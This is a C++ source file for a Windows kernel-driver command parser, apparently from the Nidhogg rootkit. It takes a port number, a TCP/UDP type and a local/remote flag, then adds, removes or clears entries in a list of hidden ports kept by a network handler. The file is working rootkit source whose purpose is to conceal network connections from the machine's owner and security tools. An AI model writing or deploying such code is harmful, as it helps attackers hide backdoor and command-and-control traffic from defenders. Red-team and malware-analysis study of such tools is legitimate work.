#include "pch.h"
#include "NetworkParser.h"
#include "NetworkHandler.h"

NetworkParser::NetworkParser() {
	this->optionsSize = 3;
	this->options = AllocateMemory<OptionMetadata*>(this->optionsSize * sizeof(OptionMetadata));

	if (!this->options)
		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);

	ArgType defaultTypes[3] = { ArgType::ULong, ArgType::ULong, ArgType::ULong };

	this->options[0] = { Options::Clear, {} };
	this->options[1] = { Options::Hide, { 3, { ArgType::ULong, ArgType::ULong,
		ArgType::ULong } } };
	this->options[2] = { Options::Unhide, { 3, { ArgType::ULong, ArgType::ULong,
		ArgType::ULong } } };
}

/*
* Description:
* Execute is responsible for executing a command and returning its value.
*
* Parameters:
* @commandId [Options]  -- Command to run.
* @args		 [PVOID*]	-- Array of args to send to the command.
*
* Returns:
* @status	 [NTSTATUS] -- Result of the command.
*/
NTSTATUS NetworkParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
	NTSTATUS status = STATUS_SUCCESS;
	HiddenPort hiddenPort{};

	if (commandId != Options::Clear) {
		hiddenPort.Port = *(USHORT*)args[0];
		hiddenPort.Type = *(PortType*)args[2];

		if (hiddenPort.Port == 0 || (hiddenPort.Type != PortType::TCP && hiddenPort.Type != PortType::UDP) ||
			*(ULONG*)args[1] > 1)
			return STATUS_INVALID_PARAMETER;

		hiddenPort.Remote = *(bool*)args[1];
	}

	switch (commandId) {
	case Options::Add:
	{
		if (!NidhoggNetworkHandler->FindHiddenPort(hiddenPort)) {
			if (!NidhoggNetworkHandler->AddHiddenPort(hiddenPort)) {
				status = STATUS_UNSUCCESSFUL;
				break;
			}
		}
		break;
	}
	case Options::Remove:
	{
		if (!NidhoggNetworkHandler->RemoveHiddenPort(hiddenPort)) {
			status = STATUS_NOT_FOUND;
			break;
		}

		break;
	}
	case Options::Clear:
	{
		NidhoggNetworkHandler->ClearHiddenPortsList(PortType::All);
		break;
	}
	default:
	{
		status = STATUS_NOT_IMPLEMENTED;
		break;
	}
	}

	return status;
}
